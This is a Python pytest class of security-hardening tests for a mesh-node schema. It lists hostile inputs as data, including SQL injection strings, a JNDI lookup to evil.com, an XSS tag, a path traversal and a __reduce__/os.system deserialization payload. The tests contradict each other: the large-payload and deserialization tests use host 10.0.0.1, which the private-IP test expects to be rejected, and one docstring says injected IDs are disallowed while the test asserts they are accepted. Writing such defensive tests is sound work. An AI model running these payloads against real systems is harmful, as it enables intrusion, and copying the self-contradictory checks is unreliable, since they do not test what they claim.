class TestSecurityHardening:
    """Validate security measures against deserialization attacks and injection."""

    def test_sql_injection_in_agent_id(self, valid_node_data: Dict[str, Any]):
        """Agent ID should not allow SQL injection patterns (defense in depth)."""
        malicious_ids = [
            "'; DROP TABLE nodes; --",
            "\" OR 1=1 --",
            "${jndi:ldap://evil.com/a}",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
        ]
        for malicious_id in malicious_ids:
            data = {**valid_node_data, "agent_id": malicious_id}
            schema = MeshNodeSchema(**data)
            # Schema should accept but not execute; validation is at application layer
            assert schema.agent_id == malicious_id

    def test_deserialization_of_malicious_payload(self):
        """Deserialization should reject payloads with extra dangerous fields."""
        malicious_json = json.dumps({
            "agent_id": "test",
            "host": "10.0.0.1",
            "port": 9000,
            "capabilities": [],
            "__class__": "MaliciousClass",
            "__reduce__": "os.system",
        })
        with pytest.raises(ValueError):
            MeshNode.from_json(malicious_json)

    def test_very_large_payload_rejection(self):
        """Extremely large payloads should be rejected."""
        large_capabilities = ["a" * 10000 for _ in range(1000)]
        data = {
            "agent_id": "test",
            "host": "10.0.0.1",
            "port": 9000,
            "capabilities": large_capabilities,
        }
        with pytest.raises(ValueError, match="too large|maximum"):
            MeshNodeSchema(**data)

    def test_private_ip_validation(self, valid_node_data: Dict[str, Any]):
        """Private IPs should be rejected by default."""
        private_ips = [
            "10.0.0.1", "10.255.255.255",
            "172.16.0.1", "172.31.255.255",
            "192.168.0.1", "192.168.255.255",
        ]
        for private_ip in private_ips:
            data = {**valid_node_data, "host": private_ip}
            with pytest.raises(ValueError, match="reserved|private"):
                MeshNodeSchema(**data)

    def test_loopback_ip_rejection(self, valid_node_data: Dict[str, Any]):
        """Loopback IPs should be rejected."""
        data = {**valid_node_data, "host": "127.0.0.1"}
        with pytest.raises(ValueError, match="loopback"):
            MeshNodeSchema(**data)

    def test_multicast_ip_rejection(self, valid_node_data: Dict[str, Any]):
        """Multicast IPs should be rejected."""
        data = {**valid_node_data, "host": "224.0.0.1"}
        with pytest.raises(ValueError, match="multicast"):
            MeshNodeSchema(**data)

    def test_link_local_ip_rejection(self, valid_node_data: Dict[str, Any]):
        """Link-local IPs should be rejected."""
        data = {**valid_node_data, "host": "169.254.1.1"}
        with pytest.raises(ValueError, match="link-local"):
            MeshNodeSchema(**data)


